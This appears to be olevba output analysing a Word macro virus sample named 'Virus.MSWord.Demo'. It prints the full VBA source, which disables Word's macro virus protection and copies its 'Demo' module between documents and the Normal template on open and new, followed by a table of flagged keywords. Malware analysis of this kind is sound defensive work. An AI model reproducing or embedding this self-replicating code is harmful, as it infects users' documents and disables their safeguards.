olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Demo-bb763f256e5537ff8ef459485222f61dba91b2f3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Demo-bb763f256e5537ff8ef459485222f61dba91b2f3 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Demo.bas 
in file: Virus.MSWord.Demo-bb763f256e5537ff8ef459485222f61dba91b2f3 - OLE stream: 'Macros/VBA/Demo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
    On Error Resume Next ' Отключение всех ошибок
    Options.VirusProtection = False ' отключение встроенной макрозащиты
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = "Demo" Then Infected = True
    Next i
    If Infected <> True Then
        ActiveDocument.VBProject.VBComponents("Demo").Export "C:\sys.sys"
        NormalTemplate.VBProject.VBComponents.Import "C:\sys.sys"
        Kill "C:\sys.sys"
    End If
    Infected = False
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = "Demo" Then Infected = True
    Next i
    If Infected <> True Then
        NormalTemplate.VBProject.VBComponents("Demo").Export "C:\sys.sys"
        ActiveDocument.VBProject.VBComponents.Import "C:\sys.sys"
        Kill "C:\sys.sys"
    End If
End Sub
Sub AutoNew()
    AutoOpen
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

